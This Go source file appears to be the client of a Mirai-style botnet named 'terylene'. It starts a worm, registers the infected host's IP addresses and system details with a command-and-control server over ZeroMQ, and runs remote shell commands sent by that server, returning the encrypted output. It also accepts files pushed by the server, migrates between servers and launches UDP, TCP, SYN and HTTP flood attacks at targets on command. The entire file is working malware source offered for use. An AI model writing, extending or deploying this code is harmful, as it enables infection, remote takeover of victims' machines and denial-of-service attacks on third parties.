package main

import (
	"bufio"
	"errors"
	"fmt"
	"log"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"sync"
	config "terylene/config"
	zcrypto "terylene/crypto"
	system "terylene/mirai/components/system"
	"terylene/mirai/components/worm"
	attack "terylene/mirai/ddos"

	"time"

	"github.com/fatih/color"
	zmq "github.com/pebbe/zmq4"
)

type Method struct {
	name         string
	path         string
	flag_entries []methflag
	rawformat    string
}

type methflag struct {
	entry     string
	entrytype string
}

type postC2info struct {
	C2ip  string
	rport string
}

type C2info struct {
	postC2info postC2info
	bport      string
}

type conninfo struct {
	connid string
	bot    string
}

type zmqinstance struct {
	zcontext    *zmq.Context
	zdealer     *zmq.Socket
	zsubscriber *zmq.Socket
}

var (
	dealmut        sync.Mutex
	custom_methods = make([]Method, 0)
)

func isValidType(t string) bool {
	validTypes := map[string]bool{
		"string": true,
		"ip":     true,
		"port":   true,
		"int":    true,
	}

	return validTypes[t]
}

func getFreshSocket() (nzmqinst zmqinstance) {
	log.Println("Getting Fresh Context")
	ncontext, err := zmq.NewContext()
	if err != nil {
		log.Fatalln(err)
	}

	ndealer, err := ncontext.NewSocket(zmq.DEALER)
	if err != nil {
		log.Fatalln(err)
	}

	nsubscriber, err := ncontext.NewSocket(zmq.SUB)

	if err != nil {
		log.Fatalln(err)
	}

	return zmqinstance{
		zcontext:    ncontext,
		zdealer:     ndealer,
		zsubscriber: nsubscriber,
	}

}

func recmig(zmqinst zmqinstance, postC2info postC2info, recsignal <-chan struct{}, migsignal <-chan postC2info) {
	select {
	case <-recsignal:
		zmqinst.zcontext.Term()
		log.Println("Reconnection triggered")
		nzmqinst := getFreshSocket()
		log.Println("reconnecting...")
		err := register(nzmqinst, postC2info, time.Minute*30)
		if zmq.AsErrno(err) == zmq.ETIMEDOUT {
			log.Println("reconnection timed out , returning to mother")
			nzmqinst.zsubscriber.SetLinger(0)
			nzmqinst.zdealer.SetLinger(0)
			nzmqinst.zdealer.Close()
			nzmqinst.zsubscriber.Close()
			nzmqinst.zcontext.Term()
			returntomother()
		} else {
			os.Exit(3)
		}
	case miginfo := <-migsignal:
		zmqinst.zcontext.Term()
		log.Println("Migration triggered")
		nzmqinst := getFreshSocket()
		err := register(nzmqinst, miginfo, time.Minute*30)
		if zmq.AsErrno(err) == zmq.ETIMEDOUT {
			log.Println("Migration timed out , returning to mother")
			nzmqinst.zsubscriber.SetLinger(0)
			nzmqinst.zdealer.SetLinger(0)
			nzmqinst.zdealer.Close()
			nzmqinst.zsubscriber.Close()
			nzmqinst.zcontext.Term()
			returntomother()
		} else {
			os.Exit(3)
		}
	}
}

func returntomother() {

	nzmqinst := getFreshSocket()

	err := register(nzmqinst, postC2info{C2ip: config.C2ip, rport: config.Routerport}, time.Hour*168)
	if zmq.AsErrno(err) == zmq.ETIMEDOUT {
		os.Exit(4)
	} else {
		os.Exit(4)
	}
}

func signalhandler(zmqins zmqinstance, C2info C2info, conninfo conninfo, subdown, dealdown chan struct{}, recsignal chan<- struct{}, submigsignal chan struct{}, dealmigsignal chan postC2info, migsignal chan postC2info) {
	for {
		select {
		case <-subdown:
			log.Println("subscriber channel down")
			select {
			case <-dealdown:
				log.Println("dealer channel down")
				recsignal <- struct{}{}
				break
			case <-time.After(time.Second * 20):
				log.Println("reconnecting subscriber channel")
				subscriber, err := zmqins.zcontext.NewSocket(zmq.SUB)
				if err != nil {
					log.Fatalln(err)
				}
				go subhandler(subscriber, C2info.postC2info.C2ip, conninfo.bot, C2info.bport, conninfo.connid, subdown, submigsignal)
			}
		case <-dealdown:
			log.Println("dealer channel down")
			select {
			case <-subdown:
				log.Println("subscriber channel down")
				recsignal <- struct{}{}
				break
			case <-time.After(time.Second * 20):
				log.Println("reconnecting dealer channel")
				ndealer, err := zmqins.zcontext.NewSocket(zmq.DEALER)
				if err != nil {
					log.Fatalln(err)
				}
				log.Println("reregistration initiating")

				err = ndealer.Connect(fmt.Sprintf("tcp://%s:%s", C2info.postC2info.C2ip, C2info.postC2info.rport))
				if err != nil {
					log.Fatalln(err)
				}

				arch, OS, pubip, localip := system.GETSYSTEM()

				if err != nil {
					log.Fatalln(err)
				}

				log.Println("generating Conn ID")
				connId := system.GenerateConnID(localip, pubip)

				ndealer.SendMessage("reg", arch, OS, localip, pubip, connId)

				res, err := ndealer.RecvMessage(0)
				if err != nil {
					log.Fatalln(err)
				}

				if res[0] == "terylene" {
					go dealerhandle(ndealer, dealdown, migsignal, res[2])
				} else {
					log.Fatalln("router reconnection declined")
				}
			}

		case <-submigsignal:
			log.Println("subscriber channel ready for migration")
			select {
			case postinfo := <-dealmigsignal:
				log.Println("dealer channel ready for migration")
				migsignal <- postinfo
				break
			case <-time.After(time.Second * 5):
				log.Println("dealer channel not ready for migration")
				log.Println("reconnecting to subscriber")
				subscriber, err := zmqins.zcontext.NewSocket(zmq.SUB)
				if err != nil {
					log.Fatalln(err)
					go subhandler(subscriber, C2info.postC2info.C2ip, conninfo.bot, C2info.bport, conninfo.connid, subdown, submigsignal)
				}
			}
		case postinfo := <-dealmigsignal:
			log.Println("dealer channel ready for migration")
			select {
			case <-submigsignal:
				log.Println("subscriber channel ready for migration")
				migsignal <- postinfo
			case <-time.After(time.Second * 5):
				log.Println("subscriber channel not ready for migration")
				log.Println("reconnecting to dealer")
				ndealer, err := zmqins.zcontext.NewSocket(zmq.DEALER)
				if err != nil {
					log.Fatalln(err)
				}
				log.Println("reregisteration initiating")

				err = ndealer.Connect(fmt.Sprintf("tcp://%s:%s", C2info.postC2info.C2ip, C2info.postC2info.rport))
				arch, OS, pubip, localip := system.GETSYSTEM()

				if err != nil {
					log.Fatalln(err)
				}

				log.Println("generating Conn ID")
				connId := system.GenerateConnID(localip, pubip)

				ndealer.SendMessage("reg", arch, OS, localip, pubip, connId)

				res, err := ndealer.RecvMessage(0)

				if res[0] == "terylene" {
					go dealerhandle(ndealer, dealdown, migsignal, res[2])
				} else {
					log.Fatalln("router reregistration declined")
				}
			}
		}
	}
}

func register(zmqins zmqinstance, postinfo postC2info, timeout time.Duration) error {

	dealer := zmqins.zdealer
	subscriber := zmqins.zsubscriber

	err := dealer.Connect(fmt.Sprintf("tcp://%s:%s", postinfo.C2ip, postinfo.rport))

	if err != nil {
		log.Fatalln(err)
	}

	subdown := make(chan struct{})
	dealdown := make(chan struct{})
	reconsignal := make(chan struct{})

	dealmigsignal := make(chan postC2info)
	migsignal := make(chan postC2info)
	submigsignal := make(chan struct{})

	if err != nil {
		log.Fatalln(err)
	}

	arch, OS, pubip, localip := system.GETSYSTEM()

	log.Println("generating Conn ID")
	connId := system.GenerateConnID(localip, pubip)

	log.Printf("registering to router %s on %s\n", postinfo.C2ip, postinfo.rport)
	_, err = dealer.SendMessage("reg", arch, OS, localip, pubip, connId)

	if err != nil {
		log.Fatalln(err)
		return err
	}

	dealer.SetRcvtimeo(timeout)

	res, err := dealer.RecvMessage(0)
	if err != nil {
		log.Fatalln(err)
		return err
	}

	if res[0] == "terylene" {
		log.Println("assigned as terylene")
		C2info := C2info{
			postC2info: postinfo,
			bport:      res[1],
		}
		conninfo := conninfo{
			connid: connId,
			bot:    res[0],
		}

		go signalhandler(zmqins, C2info, conninfo, subdown, dealdown, reconsignal, submigsignal, dealmigsignal, migsignal)
		go dealerhandle(dealer, dealdown, dealmigsignal, res[2])
		go subhandler(subscriber, postinfo.C2ip, conninfo.bot, C2info.bport, conninfo.connid, subdown, submigsignal)
		recmig(zmqins, postinfo, reconsignal, migsignal)
		return nil
	} else if res[0] == "kys" {
		for i := 1; i < 4; i++ {
			_, err := dealer.SendMessage("reg", arch, OS, localip, pubip, connId)
			if err != nil {
				break
			}
			res, err := dealer.RecvMessage(0)
			if err != nil {
				break
			}

			if res[0] == "kys" {
				time.Sleep(time.Second * 2)
			} else if res[0] == "terylene" {
				log.Println("assigned as terylene")

				C2info := C2info{
					postC2info: postinfo,
					bport:      res[1],
				}
				conninfo := conninfo{
					connid: connId,
					bot:    res[0],
				}

				go signalhandler(zmqins, C2info, conninfo, subdown, dealdown, reconsignal, submigsignal, dealmigsignal, migsignal)
				go dealerhandle(dealer, dealdown, dealmigsignal, res[2])
				go subhandler(subscriber, postinfo.C2ip, conninfo.bot, C2info.bport, conninfo.connid, subdown, submigsignal)
				recmig(zmqins, postinfo, reconsignal, migsignal)
				return nil
			} else {
				time.Sleep(time.Second * 2)
			}
		}
	}
	return err
}

func cmdhandler(command string, key []byte, dealer *zmq.Socket) {
	if command == "clear" {
		return
	}

	parts := strings.Fields(command)

	if len(parts) == 0 {
		log.Println("Empty command received")
		return
	}

	if parts[0] == "cd" {
		if len(parts) < 2 {
			output := "Invalid 'cd' command: Missing argument"
			encoutput, err := zcrypto.EncryptChaCha20Poly1305([]byte(output), key)
			if err != nil {
				log.Println(err)
				return
			}
			dealer.SendMessage("cmdE", string(encoutput))
		}

		err := os.Chdir(parts[1])
		if err != nil {
			output := fmt.Sprintf("Error changing directory:%s", err)
			encoutput, err := zcrypto.EncryptChaCha20Poly1305([]byte(output), key)
			if err != nil {
				log.Println(err)
				return
			}
			dealer.SendMessage("cmdE", string(encoutput))
		}
		return
	}

	cmd := exec.Command(parts[0], parts[1:]...)

	// Get pipe for standard output
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		fmt.Println("Error creating StdoutPipe for Cmd", err)
		return
	}

	// Start command
	if err := cmd.Start(); err != nil {
		encoutput, err := zcrypto.EncryptChaCha20Poly1305([]byte(err.Error()), key)
		if err != nil {
			log.Println(err)
			return
		}
		dealer.SendMessage("cmdE", string(encoutput))

		return
	}

	// Create new reader from the pipe
	reader := bufio.NewReader(stdout)

	// Goroutine for printing the output
	go func() {
		for {
			output, _, err := reader.ReadLine()
			if err != nil {
				break
			}

			encoutput, err := zcrypto.EncryptChaCha20Poly1305(output, key)
			if err != nil {
				log.Println(err)
				continue
			}
			dealer.SendMessage("cmdS", string(encoutput))
		}
	}()

	// Wait for the command to finish
	err = cmd.Wait()
	if err != nil {
		if err.Error() == "exit status 255" {
			return
		}
		output := fmt.Sprintf("Error waiting for command:%s", err)
		encoutput, err := zcrypto.EncryptChaCha20Poly1305([]byte(output), key)
		if err != nil {
			log.Println(err)
		}
		dealer.SendMessage("cmdE", string(encoutput))
	}
}

func dealerhandle(dealer *zmq.Socket, dealdown chan<- struct{}, dealmigsignal chan<- postC2info, key string) {
	log.Println("Subscribed to the dealer socket")
	dealer.SetRcvtimeo(time.Second * 10)
	polykey, err := zcrypto.DecryptAES256(key, []byte(config.AESkey))
	if err != nil {
		log.Fatalln(err)
	}
	for {
		res, err := dealer.RecvMessage(0)
		if err != nil {
			log.Printf("dealer channel: %s", err)
			dealer.SetLinger(0)
			dealer.Close()
			log.Println("dealer channel closed")
			dealdown <- struct{}{}
			break
		}

		if res[0] == "h" {
			dealmut.Lock()
			dealer.SendMessage("h")
			dealmut.Unlock()
		}

		if res[0] == "kill" {
			log.Fatalln("killed by C2 owner")
		}

		if len(res) == 2 {
			if res[0] == "cmd" {
				command, err := zcrypto.DecryptChaCha20Poly1305([]byte(res[1]), polykey)
				if err != nil {
					log.Println(err)
					continue
				}
				go cmdhandler(string(command), []byte(polykey), dealer)
			}
		}
		if len(res) == 3 {
			if res[0] == "migrate" {
				var details postC2info
				details.C2ip = res[1]
				details.rport = res[2]
				log.Println("dealer migration triggered")
				dealer.SetLinger(0)
				dealer.Close()
				log.Println("dealer channel closed")
				dealmigsignal <- details
				break
			}
		}

	}
}

func methodentry(rawformat string) ([]methflag, error) {
	var flags []methflag
	seen := make(map[string]bool)
	ifmain := false

	pattern := "\\$([a-zA-Z]+)::([a-zA-Z]+)"
	re := regexp.MustCompile(pattern)

	matches := re.FindAllStringSubmatch(rawformat, -1)

	if len(matches) == 0 {
		return flags, errors.New("there are no entry!!!")

	}

	for _, match := range matches {
		fmt.Println(match)

		if match[1] == "main" {
			ifmain = true
		}

		if seen[match[1]] {
			color.Red("duplication value detected:%s", match[1])
			return flags, errors.New(fmt.Sprintf("duplication value detected:%s", match[1]))
		} else {
			seen[match[1]] = true
		}

		if !isValidType(match[2]) {
			return flags, errors.New(fmt.Sprintf("invalid type '%s' for %s entry", match[2], match[1]))
		}

		flags = append(flags, methflag{entry: match[1], entrytype: match[2]})
	}

	if ifmain == false {
		return flags, errors.New("Format has no main argument")
	}

	return flags, nil
}

func subhandler(subscriber *zmq.Socket, C2ip, bot, bport, connid string, subdown chan<- struct{}, submigsignal chan<- struct{}) {
	subscriber.Connect(fmt.Sprintf("tcp://%s:%s", C2ip, bport))

	subscriber.SetRcvtimeo(time.Second * 10)
	subscriber.SetSubscribe(bot)
	subscriber.SetSubscribe(connid)
	log.Printf("subscribed to the %s channel\n", bot)

	var file *os.File
	var methname string
	var filename string
	var filepath string

	for {
		message := ""

		recved, err := subscriber.RecvMessage(0)

		if err != nil {
			log.Printf("subscriber channel: %s\n", err)
			subscriber.SetLinger(0)
			subscriber.Close()
			log.Println("subscriber channel closed")
			subdown <- struct{}{}
			break
		}

		if len(recved) == 0 || len(recved) == 1 {
			log.Println("malformed message ignored")
			continue
		}

		if len(recved) > 2 {
			switch recved[1] {
			case "file_start":
				methname = recved[2]
				filename = recved[3]
				filepath = "methods/" + filename
				file, err = os.Create(filepath)

				if err != nil {
					log.Printf("failed to create file: %v", err)
					continue
				}
			case "file_chunk":
				if file != nil && recved[2] == methname {
					_, err := file.Write([]byte(recved[3]))
					if err != nil {
						log.Printf("failed to write to file: %v", err)
						file.Close()
						file = nil
						continue
					}
				}

			case "file_end":
				if file != nil && methname == recved[2] {
					file.Close()
					file = nil

					rawformat := recved[3]
					fmt.Println(rawformat)

					entries, err := methodentry(rawformat)

					if err != nil {
						log.Println(err)
						break
					}

					fmt.Println(Method{name: methname, path: filepath, flag_entries: entries, rawformat: rawformat})

					custom_methods = append(custom_methods, Method{name: methname, path: filepath, flag_entries: entries, rawformat: rawformat})
					methname = ""
					filename = ""
				}
			}
		}

		if len(recved) == 2 {
			message = recved[1]
		} else {
			continue
		}

		if message == "migrate" {
			submigsignal <- struct{}{}
			break
		}

		if !strings.Contains(message, ":") {
			continue
		}

		go func(message string) {
			parts := strings.Split(message, ":")
			message = parts[1]
			if strings.Contains(message, "!") {
				for _, value := range config.Methods {
					if strings.Contains(message, value) {
						parts := strings.Fields(message)
						if len(parts) == 4 {
							method := strings.TrimPrefix(parts[0], "!")
							target := parts[1]
							port, err := strconv.Atoi(parts[2])
							if err != nil {
								continue
							}
							duration, err := strconv.Atoi(parts[3])
							if err != nil {
								continue
							}
							fmt.Printf("\n%s started on %s %d %d", method, target, port, duration)
							switch method {
							case "UDP":
								for i := 1; i < 2; i++ {
									go attack.UDP(target, port, duration)
								}
							case "TCP":
								for i := 1; i < 2; i++ {
									go attack.TCP(target, port, duration)
								}
							case "HTTP":
								for i := 1; i < 2; i++ {
									go attack.HTTP(target, duration)
								}
							case "UDPRAPE":
								for i := 1; i < 2; i++ {
									go attack.UDPRAPE(target, port, duration)
								}
							case "SYN":
								for i := 1; i < 2; i++ {
									go attack.SYN(target, port, duration)
								}
							case "UDP-VIP":
								for i := 1; i < 2; i++ {
									go attack.UDP_VIP(target, port, duration)
								}
							}
						}
					}
				}
			} else {
				switch message {
				case "killall":
					fmt.Println("connection killed by C2 owner")
					os.Exit(2)
				}
			}
		}(message)
	}
}
func main() {
	go worm.Startworm()
	nzmqinst := getFreshSocket()

	os.Mkdir("methods", 0755)

	register(nzmqinst, postC2info{C2ip: config.C2ip, rport: config.Routerport}, time.Second*10)
}
